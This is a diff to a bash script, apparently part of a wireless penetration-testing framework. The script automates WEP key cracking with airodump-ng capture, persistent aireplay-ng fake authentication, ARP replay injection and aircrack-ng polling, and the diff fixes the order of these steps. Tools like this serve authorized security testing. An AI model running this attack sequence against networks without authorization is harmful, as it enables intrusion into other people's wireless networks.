@@ -39,11 +39,12 @@ fi
 
 echo "[*] Starting WEP cracking attempt on ${BSSID} (Channel: ${CHANNEL:-auto})..."
 
-# 1. Start Telemetry in Background
+# 1. Start Telemetry in Background (bounded)
 (
     ELAPSED=0
-    while true; do
-        PCT=$(( 10 + (ELAPSED % 85) ))
+    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
+        PCT=$(( 10 + (ELAPSED * 80 / SCAN_TIME) ))
+        [[ $PCT -gt 90 ]] && PCT=90
         "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Cracking WEP network..."
         sleep 5; ELAPSED=$((ELAPSED + 5))
     done
@@ -51,14 +52,28 @@ echo "[*] Starting WEP cracking attempt on ${BSSID} (Channel: ${CHANNEL:-auto}).
 TEL_PID=$!
 
 # 2. Run Primary Tools
+# WEP cracking sequence:
+#   1. Start airodump-ng to capture IVs
+#   2. Fake auth FIRST (persistent re-auth every 6s) — arpreplay requires association
+#   3. Start ARP replay to generate IVs artificially
+#   4. Poll aircrack-ng every 30s until enough IVs accumulate for key recovery
+# Running arpreplay before fake auth causes "Not associated" and zero IV injection.
+CAP_FILE="${OUTPUT_BASE}-01.cap"
+
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    # Foreground execution
-    timeout --foreground "$SCAN_TIME" airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$OUTPUT_BASE" --output-format pcap,csv "$INTERFACE" &
+    timeout --foreground "$SCAN_TIME" airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "$OUTPUT_BASE" --output-format pcap,csv "$INTERFACE" &
     AIRO_PID=$!
-    aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" &
+
+    # Fake auth first — persistent (6000ms retry interval) to stay associated
+    echo "[*] Authenticating to AP (fake auth)..."
+    aireplay-ng --fakeauth 6000 -a "$BSSID" "$INTERFACE" > /dev/null 2>&1 &
+    FAKEAUTH_PID=$!
+    sleep 3   # give fakeauth time to associate before starting replay
+
+    # Now start ARP replay
+    aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" > "$AIREPLAY_LOG" 2>&1 &
     AIRE_PID=$!
-    
-    CAP_FILE="${OUTPUT_BASE}-01.cap"
+
     ELAPSED=0
     SUCCESS=0
     while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
@@ -68,19 +83,21 @@ if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
                 SUCCESS=1; break
             fi
         fi
-        aireplay-ng --fakeauth 10 -a "$BSSID" "$INTERFACE" || true
     done
-    kill "$AIRO_PID" "$AIRE_PID" 2>/dev/null || true
-    RET=$?
+    kill "$AIRO_PID" "$AIRE_PID" "$FAKEAUTH_PID" 2>/dev/null || true
 else
-    # Background execution
     (
-        airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$OUTPUT_BASE" --output-format pcap,csv "$INTERFACE" > "$AIRODUMP_LOG" 2>&1 &
+        airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "$OUTPUT_BASE" --output-format pcap,csv "$INTERFACE" > "$AIRODUMP_LOG" 2>&1 &
         AIRO_PID=$!
+
+        # Fake auth before ARP replay — required for injection association
+        aireplay-ng --fakeauth 6000 -a "$BSSID" "$INTERFACE" > /dev/null 2>&1 &
+        FAKEAUTH_PID=$!
+        sleep 3
+
         aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" > "$AIREPLAY_LOG" 2>&1 &
         AIRE_PID=$!
-        
-        CAP_FILE="${OUTPUT_BASE}-01.cap"
+
         ELAPSED=0
         SUCCESS=0
         while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
@@ -90,12 +107,11 @@ else
                     SUCCESS=1; break
                 fi
             fi
-            aireplay-ng --fakeauth 10 -a "$BSSID" "$INTERFACE" > /dev/null 2>&1 || true
         done
-        kill "$AIRO_PID" "$AIRE_PID" 2>/dev/null || true
+        kill "$AIRO_PID" "$AIRE_PID" "$FAKEAUTH_PID" 2>/dev/null || true
     ) > /dev/null 2>&1 &
     TOOL_PID=$!
-    wait $TOOL_PID; RET=$?
+    wait $TOOL_PID || true
 fi
 
 # 3. Cleanup and Final Signal
@@ -130,4 +146,11 @@ else
 fi
 
 "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
-exit $RET
+
+# Hold window if in tactical mode so user can see final output/errors
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
+    sleep 5
+fi
+
+exit 0
